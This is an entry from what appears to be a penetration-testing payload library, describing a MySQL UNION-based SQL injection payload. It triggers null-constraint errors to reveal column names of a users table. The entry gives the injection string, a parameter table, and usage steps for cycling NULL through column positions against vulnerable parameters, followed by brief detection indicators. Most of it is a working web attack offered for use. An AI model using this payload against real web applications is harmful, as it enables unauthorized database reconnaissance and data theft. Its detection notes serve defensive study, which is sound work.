---
id: e70f4a9c-ffe2-49c3-be6d-f4c765723e77
name: MySQL-Union-Injection-Null-Column-Test
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.392661+00:00'
updated_at: '2023-04-10T20:22:52.412674+00:00'
platforms:
  - Web
tags:
  - sql-injection
  - union-based
  - error-based
validated: true
---

# MySQL-Union-Injection-Null-Column-Test

## Code

```sql
?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
--Column 'id' cannot be null
```

## Description

This payload uses a UNION SELECT with a NULL (implied by mismatch) to violate a non-null constraint, causing MySQL to error with the column name, allowing extraction of schema details positionally.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| db | Database name | db |
| users | Target table | users |
| 1,2,3,4 | Placeholder values matching column count | Adjust for actual count |

## Usage

Inject into vulnerable parameters; cycle NULL through positions (e.g., SELECT 1,2,NULL,4) to trigger errors for each column. Ideal for blind error-based injection where info_schema is inaccessible.

## Detection

- Logs showing null constraint violations in UNION queries.
- Error messages exposing column names (if not suppressed).
- Intrusion detection on payloads with UNION SELECT and LIMIT 1.

## Related

- [[procedures/MySQL-Union-Based-Injection-to-Extract-Column-Names]]
